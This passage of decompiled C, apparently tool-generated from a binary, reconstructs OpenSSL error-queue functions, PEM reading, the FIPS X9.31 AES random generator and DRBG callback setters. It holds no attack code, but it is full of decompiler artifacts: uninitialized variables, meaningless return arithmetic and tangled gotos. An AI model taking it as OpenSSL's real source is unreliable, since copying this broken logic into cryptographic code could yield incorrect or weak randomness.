            v14 = v16;
        }
    }
    int64_t v17 = 0x100000000 * v14;
    int64_t v18 = v14 + 0xffffffff; // 0x43667b
    int32_t v19 = v18;
    int64_t v20 = v17 / 0x40000000; // 0x436681
    *(int32_t *)(v20 + v6) = 0;
    *(int64_t *)(v1 + 400 + v17 / 0x20000000) = 0;
    *(int32_t *)(v1 + 528 + v20) = -1;
    *v2 = v19;
    while (v19 == -1) {
        // 0x436710
        *v2 = 15;
        if (*v4 == 15) {
            // 0x436730
            return 0;
        }
        v7 = (int32_t *)(76 + v1);
        v8 = *v7;
        if (v8 % 2 != 0) {
            // break (via goto) -> 0x436738
            goto lab_0x436738;
        }
        // 0x4366c1
        *v7 = 0;
        v9 = *v2;
        v10 = v9;
        v11 = v9;
        v12 = 8 * v11;
        v13 = *(int64_t *)(v12 + v5);
        *(int64_t *)(v1 + 80 + v12) = 0;
        v14 = v10;
        if (v13 != 0) {
            // 0x4366e7
            v14 = v10;
            if (*(char *)(4 * v11 + v6) % 2 != 0) {
                // 0x4366f1
                CRYPTO_free(v13, v15);
                v16 = *v2;
                *(int64_t *)(8 * (int64_t)v16 + v5) = 0;
                v14 = v16;
            }
        }
        // 0x436678
        v17 = 0x100000000 * v14;
        v18 = v14 + 0xffffffff;
        v19 = v18;
        v20 = v17 / 0x40000000;
        *(int32_t *)(v20 + v6) = 0;
        *(int64_t *)(v1 + 400 + v17 / 0x20000000) = 0;
        *(int32_t *)(v1 + 528 + v20) = -1;
        *v2 = v19;
    }
    // 0x4366ab
    while (*v4 != v19) {
        // 0x4366b3
        v7 = (int32_t *)(v1 + 16 + 0x100000000 * (v18 & 0xffffffff) / 0x40000000);
        v8 = *v7;
        if (v8 % 2 != 0) {
            // break (via goto) -> 0x436738
            goto lab_0x436738;
        }
        // 0x4366c1
        *v7 = 0;
        v9 = *v2;
        v10 = v9;
        v11 = v9;
        v12 = 8 * v11;
        v13 = *(int64_t *)(v12 + v5);
        *(int64_t *)(v1 + 80 + v12) = 0;
        v14 = v10;
        if (v13 != 0) {
            // 0x4366e7
            v14 = v10;
            if (*(char *)(4 * v11 + v6) % 2 != 0) {
                // 0x4366f1
                CRYPTO_free(v13, v15);
                v16 = *v2;
                *(int64_t *)(8 * (int64_t)v16 + v5) = 0;
                v14 = v16;
            }
        }
        // 0x436678
        v17 = 0x100000000 * v14;
        v18 = v14 + 0xffffffff;
        v19 = v18;
        v20 = v17 / 0x40000000;
        *(int32_t *)(v20 + v6) = 0;
        *(int64_t *)(v1 + 400 + v17 / 0x20000000) = 0;
        *(int32_t *)(v1 + 528 + v20) = -1;
        *v2 = v19;
        while (v19 == -1) {
            // 0x436710
            *v2 = 15;
            if (*v4 == 15) {
                // 0x436730
                return 0;
            }
            v7 = (int32_t *)(76 + v1);
            v8 = *v7;
            if (v8 % 2 != 0) {
                // break (via goto) -> 0x436738
                goto lab_0x436738;
            }
            // 0x4366c1
            *v7 = 0;
            v9 = *v2;
            v10 = v9;
            v11 = v9;
            v12 = 8 * v11;
            v13 = *(int64_t *)(v12 + v5);
            *(int64_t *)(v1 + 80 + v12) = 0;
            v14 = v10;
            if (v13 != 0) {
                // 0x4366e7
                v14 = v10;
                if (*(char *)(4 * v11 + v6) % 2 != 0) {
                    // 0x4366f1
                    CRYPTO_free(v13, v15);
                    v16 = *v2;
                    *(int64_t *)(8 * (int64_t)v16 + v5) = 0;
                    v14 = v16;
                }
            }
            // 0x436678
            v17 = 0x100000000 * v14;
            v18 = v14 + 0xffffffff;
            v19 = v18;
            v20 = v17 / 0x40000000;
            *(int32_t *)(v20 + v6) = 0;
            *(int64_t *)(v1 + 400 + v17 / 0x20000000) = 0;
            *(int32_t *)(v1 + 528 + v20) = -1;
            *v2 = v19;
        }
    }
    // 0x436730
    return 0;
  lab_0x436738:
    // 0x436738
    *v7 = v8 & -2;
    return 1;
}

// Address range: 0x436750 - 0x43677a
int64_t ERR_set_mark(int64_t a1, int64_t a2, int64_t a3) {
    int64_t v1 = ERR_get_state(); // 0x436754
    uint32_t v2 = *(int32_t *)(v1 + 592); // 0x43675b
    int64_t result = 0; // 0x436767
    if (*(int32_t *)(v1 + 596) != v2) {
        int32_t * v3 = (int32_t *)(v1 + 16 + 0x100000000 * (int64_t)v2 / 0x40000000); // 0x43676e
        *v3 = *v3 | 1;
        result = 1;
    }
    // 0x436773
    return result;
}

// Address range: 0x436950 - 0x436992
int64_t ERR_add_error_data(int64_t a1, char * a2, int64_t a3, char * a4, int64_t * a5, char * a6) {
    // 0x436950
    int64_t v1; // 0x436950
    return 0x4369b2 - (4 * v1 & 1020);
}

// Address range: 0x4369f0 - 0x436be8
int64_t get_error_values(int32_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t v1 = ERR_get_state(); // 0x436a22
    if ((int32_t)a2 != 0 && a1 != 0) {
        if (a3 != 0) {
            // 0x436a3d
            *(int64_t *)a3 = (int64_t)&g78;
        }
        if (a4 != 0) {
            // 0x436a4d
            *(int32_t *)a4 = 0;
        }
        if (a5 != 0) {
            // 0x436a5a
            *(int64_t *)a5 = (int64_t)&g78;
        }
        // 0x436a64
        if (a6 == 0) {
            // 0x436a75
            return 68;
        }
        // 0x436a6e
        *(int32_t *)a6 = 0;
        // 0x436a75
        return 68;
    }
    int32_t * v2 = (int32_t *)(v1 + 596); // 0x436aa0
    int32_t v3 = *v2; // 0x436aa0
    int32_t v4 = *(int32_t *)(v1 + 592); // 0x436aa6
    if (v3 == v4) {
        // 0x436a75
        return 0;
    }
    int64_t * v5; // 0x4369f0
    int64_t v6; // 0x4369f0
    int64_t v7; // 0x4369f0
    int64_t v8; // 0x4369f0
    int64_t result; // 0x4369f0
    int32_t v9; // 0x4369f0
    int64_t v10; // 0x4369f0
    int64_t v11; // 0x4369f0
    if ((int32_t)a2 == 0) {
        int32_t v12 = (v3 + 1) % 16; // 0x436b40
        int64_t v13 = v12; // 0x436b44
        int64_t v14 = v13 + 10; // 0x436b47
        int64_t * v15 = (int64_t *)(8 * v14 + v1);
        int64_t v16 = *v15; // 0x436b4b
        v5 = v15;
        v9 = v12;
        v8 = v16;
        v6 = v13;
        v10 = v14;
        result = v16;
        v7 = v13;
        v11 = v14;
        if (a1 == 0) {
            goto lab_0x436ad4;
        } else {
            goto lab_0x436ac6;
        }
    } else {
        int64_t v17 = v4; // 0x436ab7
        int64_t v18 = v17 + 10; // 0x436abc
        int64_t * v19 = (int64_t *)(8 * v18 + v1);
        int64_t v20 = *v19; // 0x436ac0
        v5 = v19;
        v9 = v4;
        v8 = v20;
        v6 = v17;
        v10 = v18;
        result = v20;
        v7 = v17;
        v11 = v18;
        if (a1 == 0) {
            goto lab_0x436ad4;
        } else {
            goto lab_0x436ac6;
        }
    }
  lab_0x436ad4:
    // 0x436ad4
    if (a3 != 0 && a4 != 0) {
        int64_t v21 = *(int64_t *)(v1 + 400 + 8 * v7); // 0x436ade
        if (v21 == 0) {
            // 0x436bd0
            *(int32_t *)a4 = 0;
            *(int64_t *)a3 = (int64_t)"NA";
        } else {
            // 0x436aef
            *(int64_t *)a3 = v21;
            *(int32_t *)a4 = *(int32_t *)(v1 + 528 + 4 * v7);
        }
    }
    if (a5 != 0) {
        int64_t v22 = *(int64_t *)(v1 + 208 + 8 * v7); // 0x436b03
        int64_t * v23 = (int64_t *)a5;
        if (v22 == 0) {
            // 0x436b60
            *v23 = (int64_t)&g78;
            if (a6 != 0) {
                // 0x436a6e
                *(int32_t *)a6 = 0;
                // 0x436a75
                return result;
            }
        } else {
            // 0x436b10
            *v23 = v22;
            if (a6 != 0) {
                // 0x436b1c
                *(int32_t *)a6 = *(int32_t *)(v1 + 336 + 4 * v7);
            }
        }
        // 0x436a75
        return result;
    }
    // 0x436b80
    if (a1 == 0) {
        // 0x436a75
        return result;
    }
    int64_t * v24 = (int64_t *)(v1 + 208 + 8 * v7); // 0x436b8c
    int64_t v25 = *v24; // 0x436b8c
    int64_t v26 = v1 + 336 + 4 * v7;
    if (v25 == 0) {
        // 0x436bb6
        *(int32_t *)v26 = 0;
        // 0x436a75
        return result;
    }
    // 0x436b95
    if (*(char *)v26 % 2 != 0) {
        // 0x436b9f
        CRYPTO_free(v25, v11);
        *v24 = 0;
    }
    // 0x436bb6
    *(int32_t *)v26 = 0;
    // 0x436a75
    return result;
  lab_0x436ac6:
    // 0x436ac6
    *v2 = v9;
    *v5 = 0;
    result = v8;
    v7 = v6;
    v11 = v10;
    goto lab_0x436ad4;
}

// Address range: 0x436c30 - 0x436c46
int64_t ERR_peek_last_error(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x436c30
    return get_error_values(0, 1, 0, 0, 0, 0);
}

// Address range: 0x436c90 - 0x436ca3
int64_t ERR_peek_error(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    // 0x436c90
    return get_error_values(0, 0, 0, 0, 0, 0);
}

// Address range: 0x436cb0 - 0x436cc8
int64_t ERR_get_error_line_data(int64_t * a1, int64_t * a2, int64_t * a3, int64_t * a4) {
    // 0x436cb0
    return get_error_values(1, 0, (int64_t)a1, (int64_t)a2, (int64_t)a3, (int64_t)a4);
}

// Address range: 0x436d10 - 0x436dab
int64_t ERR_clear_error(void) {
    int64_t v1 = ERR_get_state(); // 0x436d18
    int64_t result = v1; // 0x436d20
    for (int64_t i = 0; i < 61; i += 4) {
        int64_t v2 = result;
        int64_t v3 = 2 * i + v1;
        int64_t * v4 = (int64_t *)(v3 + 208); // 0x436d54
        int64_t v5 = *v4; // 0x436d54
        int64_t v6 = i + v1;
        *(int32_t *)(v6 + 16) = 0;
        *(int64_t *)(v3 + 80) = 0;
        int64_t v7 = v6 + 336;
        int64_t v8 = v2; // 0x436d70
        if (v5 != 0) {
            // 0x436d72
            v8 = v2;
            if (*(char *)v7 % 2 != 0) {
                // 0x436d7c
                int64_t v9; // 0x436d10
                int64_t v10 = CRYPTO_free(v5, v9); // 0x436d7c
                *v4 = 0;
                v8 = v10;
            }
        }
        // 0x436d28
        result = v8;
        *(int32_t *)v7 = 0;
        *(int64_t *)(v3 + 400) = 0;
        *(int32_t *)(v6 + 528) = -1;
    }
    // 0x436d90
    *(int32_t *)(v1 + 596) = 0;
    *(int32_t *)(v1 + 592) = 0;
    return result;
}

// Address range: 0x436db0 - 0x436ecd
int64_t ERR_put_error(int64_t a1, int64_t a2, uint64_t a3, char * a4, int64_t a5) {
    int64_t result = ERR_get_state(); // 0x436dda
    int32_t * v1 = (int32_t *)(result + 592); // 0x436ddf
    int32_t v2 = (*v1 + 1) % 16; // 0x436df5
    int32_t * v3 = (int32_t *)(result + 596); // 0x436df7
    *v1 = v2;
    int64_t v4 = a2; // 0x436e03
    if (v2 == *v3) {
        // 0x436eb0
        *v3 = (v2 + 1) % 16;
        v4 = 0;
    }
    int64_t v5 = 0x100000000 * (int64_t)v2;
    int64_t v6 = v5 / 0x20000000; // 0x436e19
    int64_t v7 = result + 208; // 0x436e19
    int64_t v8 = *(int64_t *)(v6 + v7); // 0x436e19
    int64_t v9 = v5 / 0x40000000;
    int64_t v10 = v9 + result;
    *(int32_t *)(v10 + 16) = 0;
    int64_t v11 = v6 + result;
    *(int64_t *)(v11 + 400) = (int64_t)a4;
    *(int32_t *)(v10 + 528) = (int32_t)a5;
    *(int64_t *)(v11 + 80) = a3 % 0x1000 | 0x1000000 * a1 & 0xff000000 | 0x1000 * a2 & 0xfff000;
    if (v8 == 0) {
        // 0x436e82
        *(int32_t *)(v9 + result + 336) = 0;
        return result;
    }
    int64_t v12 = result + 336;
    int64_t v13 = v9; // 0x436e5c
    if (*(char *)(4 * (int64_t)v2 + v12) % 2 != 0) {
        // 0x436e5e
        CRYPTO_free(v8, v4);
        uint32_t v14 = *v1; // 0x436e6d
        *(int64_t *)(8 * (int64_t)v14 + v7) = 0;
        v13 = 0x100000000 * (int64_t)v14 / 0x40000000;
    }
    // 0x436e82
    *(int32_t *)(v13 + v12) = 0;
    return result;
}

// Address range: 0x436f30 - 0x437130
int64_t ERR_error_string_n(uint64_t a1, int64_t a2, uint64_t a3) {
    int64_t v1 = __readfsqword(40); // 0x436f5e
    int64_t v2 = ERR_lib_error_string(a1); // 0x436f71
    int64_t v3 = ERR_func_error_string(a1); // 0x436f7c
    int64_t v4 = ERR_reason_error_string(a1); // 0x436f87
    int64_t v5; // bp-136, 0x436f30
    int64_t v6; // 0x436f30
    int64_t v7; // 0x436f30
    if (v2 == 0) {
        // 0x4370d0
        BIO_snprintf((int64_t)&v5, 64, "lib(%lu)", a1 / 0x1000000 % 256, v7, v6);
    }
    int64_t v8; // bp-200, 0x436f30
    if (v3 == 0) {
        // 0x437100
        BIO_snprintf((int64_t)&v8, 64, "func(%lu)", a1 / 0x1000 % 0x1000, v7, v6);
    }
    if (v4 == 0) {
        // 0x4370a0
        int64_t v9; // bp-264, 0x436f30
        BIO_snprintf((int64_t)&v9, 64, "reason(%lu)", a1 % 0x1000, v7, v6);
    }
    int64_t v10 = v3 == 0 ? (int64_t)&v8 : v3; // 0x436fc7
    int64_t v11 = v2 != 0 ? v2 : (int64_t)&v5; // 0x436fd1
    BIO_snprintf(a2, a3, "error:%08lX:%s:%s:%s", a1, v11, v10);
    char * str = (char *)a2; // 0x436fe6
    char * v12; // 0x436f30
    int64_t v13; // 0x436f30
    int64_t v14; // 0x436f30
    int64_t v15; // 0x436f30
    if (a3 < 5 | a3 - 1 != (int64_t)strlen(str)) {
        goto lab_0x436ff4;
    } else {
        // 0x43704e
        v15 = a3 + a2;
        int64_t v16 = v15 - 5; // 0x437056
        char * found_char_pos = strchr(str, 58); // 0x43705b
        v13 = v16;
        v12 = found_char_pos;
        v14 = v16;
        if (found_char_pos == NULL) {
            goto lab_0x43706f;
        } else {
            goto lab_0x43706a;
        }
    }
  lab_0x436ff4:;
    int64_t result = __readfsqword(40) ^ v1; // 0x436ffc
    if (result != 0) {
        // 0x43712a
        __stack_chk_fail();
        return &g299;
    }
    // 0x43700b
    return result;
  lab_0x43706f:
    // 0x43706f
    *(char *)v14 = 58;
    int64_t v17 = v14; // 0x437072
    int64_t v18 = v14; // 0x437072
    goto lab_0x437075;
  lab_0x43706a:;
    int64_t v20 = (int64_t)v12;
    v14 = v13;
    v17 = v13;
    v18 = v20;
    if (v13 < v20) {
        goto lab_0x43706f;
    } else {
        goto lab_0x437075;
    }
  lab_0x437075:;
    int64_t v19 = v17 + 1; // 0x437075
    if (v19 == v15 - 1) {
        goto lab_0x436ff4;
    } else {
        char * found_char_pos2 = strchr((char *)(v18 + 1), 58); // 0x43708b
        v13 = v19;
        v12 = found_char_pos2;
        v14 = v19;
        if (found_char_pos2 != NULL) {
            goto lab_0x43706a;
        } else {
            goto lab_0x43706f;
        }
    }
}

// Address range: 0x437de0 - 0x437dff
int64_t PEM_read_bio_RSAPublicKey(int64_t a1, int64_t a2, int64_t a3, int64_t a4) {
    // 0x437de0
    return PEM_ASN1_read_bio(g165, "RSA PUBLIC KEY", a1, a2, a3, a4);
}

// Address range: 0x438600 - 0x4386ab
int64_t PEM_ASN1_read_bio(int64_t a1, char * a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t v1 = 0; // bp-32, 0x438628
    int64_t result = 0; // bp-40, 0x438631
    int64_t v2; // bp-48, 0x438600
    int64_t v3 = PEM_bytes_read_bio(&result, &v2, 0, (int64_t)a2, a3, a5, a6); // 0x43863a
    if ((int32_t)v3 == 0) {
        // 0x438647
        return 0;
    }
    // 0x438650
    v1 = result;
    int64_t v4 = &v1; // 0x43866f
    if (result == 0) {
        // 0x438688
        ERR_put_error(9, 103, 13, "pem_oth.c", 83);
        v4 = 103;
    }
    // 0x438671
    CRYPTO_free(result, v4);
    return result;
}

// Address range: 0x43c9b0 - 0x43c9b8
int64_t FIPS_x931_method(void) {
    // 0x43c9b0
    return &g153;
}

// Address range: 0x43ca10 - 0x43cab7
int64_t FIPS_x931_reset(void) {
    // 0x43ca10
    CRYPTO_lock(9, 18, "fips_rand.c", 424, (int64_t)&g299, (int64_t)&g299);
    g233 = 0;
    g234 = 0;
    g235 = 0;
    g238 = 0;
    g236 = 0;
    g237 = 0;
    g240 = 0;
    OPENSSL_cleanse((int64_t)&g244, 16);
    OPENSSL_cleanse((int64_t)&g239, 244);
    return CRYPTO_lock(10, 18, "fips_rand.c", 426, (int64_t)&g299, (int64_t)&g299);
}

// Address range: 0x43cb10 - 0x43cb60
int64_t FIPS_x931_test_mode(void) {
    // 0x43cb10
    if (g234 != 0) {
        // 0x43cb38
        ERR_put_error(36, 105, 109, "fips_rand.c", 211);
        return 0;
    }
    // 0x43cb1e
    g235 = 1;
    return 1;
}

// Address range: 0x43cbc0 - 0x43cc18
int64_t FIPS_x931_set_dt(int64_t a1) {
    // 0x43cbc0
    if (g235 == 0) {
        // 0x43cbf0
        ERR_put_error(36, 106, 106, "fips_rand.c", 233);
        return 0;
    }
    // 0x43cbce
    g246 = a1;
    g247 = *(int64_t *)(a1 + 8);
    return 1;
}

// Address range: 0x43cc20 - 0x43ccd3
int64_t FIPS_get_timevec(int64_t * a1, int64_t * a2) {
    int64_t v1 = (int64_t)a1;
    char tp; // bp-40, 0x43cc20
    gettimeofday((struct timeval *)&tp, NULL);
    *(char *)a1 = tp;
    *(char *)(v1 + 1) = 0;
    *(char *)(v1 + 3) = 0;
    *(char *)(v1 + 2) = 0;
    *(char *)(v1 + 5) = 0;
    *(char *)(v1 + 7) = 0;
    *(char *)(v1 + 6) = 0;
    *(char *)(v1 + 8) = 0;
    *(char *)(v1 + 9) = 0;
    *(char *)(v1 + 10) = 0;
    *(char *)(v1 + 11) = 0;
    *a2 = 1;
    int32_t pid = getpid(); // 0x43cca7
    uint64_t v2 = (int64_t)pid; // 0x43ccac
    *(char *)(v1 + 12) = (char)pid;
    *(char *)(v1 + 13) = (char)(v2 / 256);
    uint64_t result = v2 / 0x1000000; // 0x43ccbe
    *(char *)(v1 + 15) = (char)result;
    *(char *)(v1 + 14) = (char)(v2 / 0x10000);
    return result;
}

// Address range: 0x43cce0 - 0x43d000
int64_t FIPS_x931_bytes(int64_t * a1, int64_t a2) {
    int64_t v1 = __readfsqword(40); // 0x43cd09
    CRYPTO_lock(9, 18, "fips_rand.c", 407, v1, (int64_t)&g299);
    int64_t v2; // 0x43cce0
    int64_t result; // 0x43cce0
    int64_t v3; // bp-88, 0x43cce0
    uint32_t v4; // 0x43cce0
    if (g237 != 0) {
        // 0x43cf85
        ERR_put_error(36, 103, 108, "fips_rand.c", 321);
        result = 0;
    } else {
        // 0x43cd2e
        if (g234 == 0) {
            // 0x43cfaa
            ERR_put_error(36, 103, 107, "fips_rand.c", 326);
            result = 0;
        } else {
            // 0x43cd3e
            if (g233 == 0) {
                // 0x43cfd2
                ERR_put_error(36, 103, 100, "fips_rand.c", 331);
                result = 0;
            } else {
                // 0x43cd4e
                while (true) {
                  lab_0x43cd70:
                    // 0x43cd70
                    if (g235 == 0) {
                        // 0x43ce8b
                        FIPS_get_timevec(&g246, &g238);
                        goto lab_0x43cd78;
                    } else {
                        goto lab_0x43cd78;
                    }
                }
              lab_0x43cf6f:
                // 0x43cf6f
                memcpy((int64_t *)v2, &v3, v4);
                result = 1;
            }
        }
    }
    goto lab_0x43cf2f;
  lab_0x43cd78:;
    // 0x43cd78
    int64_t v5; // bp-104, 0x43cce0
    AES_encrypt(&g246, &v5, &g239);
    int64_t v6; // 0x43cce0
    char v7 = *(char *)v6; // 0x43cdb0
    int64_t v8 = v6 + 1; // 0x43cdb3
    int64_t v9; // 0x43cce0
    int64_t v10; // 0x43cce0
    *(char *)v10 = v7 ^ *(char *)v9;
    v6 = v8;
    v10++;
    v9++;
    int64_t v11; // 0x43cd67
    while (v8 != v11) {
        int64_t v12 = v9;
        int64_t v13 = v10;
        int64_t v14 = v6;
        char v15 = *(char *)v12; // 0x43cda8
        v7 = *(char *)v14;
        v8 = v14 + 1;
        *(char *)v13 = v7 ^ v15;
        v6 = v8;
        v10 = v13 + 1;
        v9 = v12 + 1;
    }
    // 0x43cdc3
    int64_t v16; // bp-120, 0x43cce0
    AES_encrypt(&v16, &v3, &g239);
    int64_t v17 = v11 + 1; // 0x43cdfa
    int64_t v18; // 0x43cce0
    int64_t v19; // 0x43cce0
    *(char *)v19 = *(char *)v11 ^ *(char *)v18;
    int64_t v20 = v18 + 1; // 0x43ce08
    int64_t v21 = v19 + 1; // 0x43ce08
    int64_t v22; // 0x43cd6b
    while (v17 != v22) {
        char v23 = *(char *)v17; // 0x43cdf7
        v17++;
        *(char *)v21 = v23 ^ *(char *)v20;
        v20++;
        v21++;
    }
    // 0x43ce0a
    AES_encrypt(&v16, (int64_t *)&g244, &g239);
    if (g236 == 0) {
        // 0x43ce53
        g248 = (char *)v3;
        g236 = 1;
        if (g235 != 0) {
            goto lab_0x43cea8;
        } else {
            // 0x43ce8b
            FIPS_get_timevec(&g246, &g238);
            goto lab_0x43cd78;
        }
    } else {
        // 0x43ce2c
        if (g232 != 0) {
            // 0x43cee0
            g248 = (char *)v3;
        }
        int64_t v24 = 16; // 0x43ce4b
        int64_t v25 = v11;
        int64_t v26 = (int64_t)&g248;
        while (*(char *)v25 == *(char *)v26) {
            v24--;
            if (v24 == 0) {
                // 0x43cefd
                ERR_put_error(36, 103, 104, "fips_rand.c", 352);
                g237 = 1;
                fips_set_selftest_fail();
                result = 0;
                goto lab_0x43cf2f;
            }
            int64_t v27; // 0x43cce0
            v25 += v27;
            v26 += v27;
        }
        // 0x43ce53
        g248 = (char *)v3;
        goto lab_0x43cea8;
    }
  lab_0x43cea8:;
    // 0x43cea8
    uint64_t v28; // 0x43cce0
    v4 = (int32_t)v28;
    if (v4 < 17) {
        // break -> 0x43cf6f
        goto lab_0x43cf6f;
    }
    // 0x43ceb3
    *(int64_t *)v2 = v3;
    goto lab_0x43cd70;
  lab_0x43cf2f:
    // 0x43cf2f
    CRYPTO_lock(10, 18, "fips_rand.c", 409, (int64_t)&g299, (int64_t)&g299);
    if (v1 == __readfsqword(40)) {
        // 0x43cf60
        return result;
    }
    // 0x43cffa
    __stack_chk_fail();
    return &g299;
}

// Address range: 0x43d000 - 0x43d139
int64_t FIPS_x931_set_key(int64_t a1, int64_t a2) {
    // 0x43d000
    int64_t v1; // 0x43d000
    int64_t v2; // 0x43d000
    CRYPTO_lock(9, 18, "fips_rand.c", 383, v2, v1);
    if ((int32_t)FIPS_selftest_failed() != 0) {
        // 0x43d110
        ERR_put_error(45, 153, 101, "fips_rand.c", 144);
        // 0x43d05a
        CRYPTO_lock(10, 18, "fips_rand.c", 385, (int64_t)&g299, (int64_t)&g299);
        return 0;
    }
    int32_t v3 = a2; // 0x43d040
    int64_t result = 0; // 0x43d000
    switch (v3) {
        case 24: {
            goto lab_0x43d0d0;
        }
        case 16: {
            goto lab_0x43d0d0;
        }
        case 32: {
            // 0x43d090
            AES_set_encrypt_key(a1, 256, &g239);
            // 0x43d0a4
            g234 = 1;
            goto lab_0x43d0ae;
        }
        default: {
            goto lab_0x43d05a;
        }
    }
  lab_0x43d0d0:
    // 0x43d0d0
    AES_set_encrypt_key(a1, 8 * a2 & 0xfffffff8, &g239);
    if (v3 != 16) {
        // 0x43d0a4
        g234 = 1;
        goto lab_0x43d0ae;
    } else {
        // 0x43d0eb
        g242 = (char *)a1;
        g234 = 2;
        g243 = *(int64_t *)(a1 + 8);
        goto lab_0x43d0ae;
    }
  lab_0x43d0ae:
    // 0x43d0ae
    g233 = 0;
    g236 = 0;
    result = 1;
  lab_0x43d05a:
    // 0x43d05a
    CRYPTO_lock(10, 18, "fips_rand.c", 385, (int64_t)&g299, (int64_t)&g299);
    return result;
}

// Address range: 0x43d150 - 0x43d2e0
int64_t FIPS_x931_seed(int64_t a1, int64_t a2) {
    // 0x43d150
    int64_t v1; // 0x43d150
    int64_t v2; // 0x43d150
    CRYPTO_lock(9, 18, "fips_rand.c", 397, v2, v1);
    if (g234 == 0) {
        // 0x43d22f
        CRYPTO_lock(10, 18, "fips_rand.c", 399, (int64_t)&g299, (int64_t)&g299);
        return 0;
    }
    uint32_t v3 = (int32_t)a2;
    int64_t result; // 0x43d150
    if (g235 != 0) {
        // 0x43d228
        result = 0;
        if (v3 == 16) {
            // 0x43d291
            g244 = (char *)9;
            g233 = 1;
            g245 = *(int64_t *)(a1 + 8);
            result = a2 & 0xffffff00 | 1;
        }
        // 0x43d22f
        CRYPTO_lock(10, 18, "fips_rand.c", 399, (int64_t)&g299, (int64_t)&g299);
        return result;
    }
    // 0x43d19e
    if (v3 == 0) {
        // 0x43d22f
        CRYPTO_lock(10, 18, "fips_rand.c", 399, (int64_t)&g299, (int64_t)&g299);
        return 1;
    }
    // 0x43d1cd
    bool v4; // 0x43d150
    int64_t v5 = v4 ? -1 : 1;
    int32_t v6 = a1;
    int64_t v7 = a1; // 0x43d150
    while (true) {
        int64_t v8 = v7;
        char * v9 = (char *)((int64_t)g240 + (int64_t)&g243 + 8); // 0x43d1d6
        *v9 = *(char *)v8 ^ *v9;
        g240 = &g241;
        if ((int32_t)&g241 != 16) {
            int64_t v10 = v8 + 1; // 0x43d1c0
            v7 = v10;
            result = 1;
            if ((int32_t)v10 - v6 >= v3) {
                // break -> 0x43d22f
                break;
            }
        } else {
            // 0x43d1f3
            g240 = 0;
            int64_t v11 = 16; // 0x43d204
            int64_t v12 = (int64_t)&g244; // 0x43d204
            if (g234 == 2) {
                if (v11 == 0) {
                    // 0x43d2b8
                    ERR_put_error(36, 107, 110, "fips_rand.c", 195);
                    result = 0;
                    goto lab_0x43d22f;
                }
                int64_t v13 = (int64_t)&g242;
                char v14 = *(char *)v12; // 0x43d26d
                v11--;
                int64_t v15 = v13 + v5; // 0x43d26d
                v12 += v5;
                while (*(char *)v13 == v14) {
                    // 0x43d260
                    if (v11 == 0) {
                        // 0x43d2b8
                        ERR_put_error(36, 107, 110, "fips_rand.c", 195);
                        result = 0;
                        goto lab_0x43d22f;
                    }
                    v13 = v15;
                    v14 = *(char *)v12;
                    v11--;
                    v15 = v13 + v5;
                    v12 += v5;
                }
                // 0x43d271
                OPENSSL_cleanse((int64_t)&g242, 16);
                g234 = 1;
            }
            int64_t v16 = v8 + 1; // 0x43d206
            g233 = 1;
            v7 = v16;
            result = 1;
            if ((int32_t)v16 - v6 >= v3) {
                // break -> 0x43d22f
                break;
            }
        }
    }
  lab_0x43d22f:
    // 0x43d22f
    CRYPTO_lock(10, 18, "fips_rand.c", 399, (int64_t)&g299, (int64_t)&g299);
    return result;
}

// Address range: 0x43d320 - 0x43d352
int64_t FIPS_drbg_set_callbacks(int64_t a1, int64_t a2, int64_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t result = 0; // 0x43d329
    if (*(int32_t *)(a1 + 104) == 0) {
        // 0x43d32b
        *(int64_t *)(a1 + 1024) = a4;
        *(int64_t *)(a1 + 1032) = a2;
        *(int64_t *)(a1 + 1040) = a3;
        *(int64_t *)(a1 + 1048) = a5;
        *(int64_t *)(a1 + 1056) = a6;
        result = 1;
    }
    // 0x43d350
    return result;
}

// Address range: 0x43d360 - 0x43d38b
int64_t FIPS_drbg_set_rand_callbacks(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5) {
    int64_t result = 0; // 0x43d369
    if (*(int32_t *)(a1 + 104) == 0) {
        // 0x43d36b
        *(int64_t *)(a1 + 1136) = a2;
        *(int64_t *)(a1 + 1144) = (int64_t)a3;
        *(int64_t *)(a1 + 1152) = a4;
        *(int64_t *)(a1 + 1160) = a5;
        result = 1;
    }
    // 0x43d389
    return result;
}

// Address range: 0x43d3a0 - 0x43d3a5
int64_t FIPS_drbg_set_app_data(int64_t a1, int64_t a2) {
    // 0x43d3a0
    *(int64_t *)(a1 + 112) = a2;
    int64_t result; // 0x43d3a0
    return result;
}

// Address range: 0x43d400 - 0x43d519
int64_t fips_get_entropy(int64_t a1, int64_t * a2, int32_t a3, int64_t a4, uint64_t a5) {
    uint64_t result = *(int64_t *)(a1 + 1032); // 0x43d41b
    uint64_t v1 = *(int64_t *)(a1 + 1024); // 0x43d425
    if (result == 0) {
        // 0x43d4e8
        return 0;
    }
    // 0x43d435
    if (v1 == 0 | (*(char *)(a1 + 4) & 2) != 0) {
        // 0x43d4e8
        return result;
    }
    // 0x43d448
    char * v2; // 0x43d400
    if (v2 == NULL) {
        // 0x43d4e8
        return 0;
    }
    int64_t v3 = (int64_t)v2; // 0x43d45c
    *a2 = v1 + v3;
    if (v1 + a4 > result || result % v1 != 0) {
        // 0x43d4e8
        return 0;
    }
    uint64_t v4 = result - v1; // 0x43d492
    uint64_t v5 = v4 + v3; // 0x43d495
    if (v5 <= v3) {
        // 0x43d4e8
        return v4 > a5 ? a5 : v4;
    }
    // 0x43d4a8
    bool v6; // 0x43d400
    int64_t v7 = v6 ? -1 : 1;
    int64_t v8 = v3 + v1; // 0x43d4a8
    int64_t v9 = v1; // 0x43d4b5
    int64_t v10 = v8; // 0x43d4b5
    if (v9 == 0) {
        // break (via goto) -> 0x43d4b9
        goto lab_0x43d4b9;
    }
    int64_t v11 = v3;
    char v12 = *(char *)v10; // 0x43d4b5
    v9--;
    int64_t v13 = v11 + v7; // 0x43d4b5
    v10 += v7;
    while (*(char *)v11 == v12) {
        if (v9 == 0) {
            // break (via goto) -> 0x43d4b9
            goto lab_0x43d4b9;
        }
        v11 = v13;
        v12 = *(char *)v10;
        v9--;
        v13 = v11 + v7;
        v10 += v7;
    }
    while (v8 < v5) {
        int64_t v14 = v8;
        v8 = v14 + v1;
        v9 = v1;
        v10 = v8;
        if (v9 == 0) {
            // break (via goto) -> 0x43d4b9
            goto lab_0x43d4b9;
        }
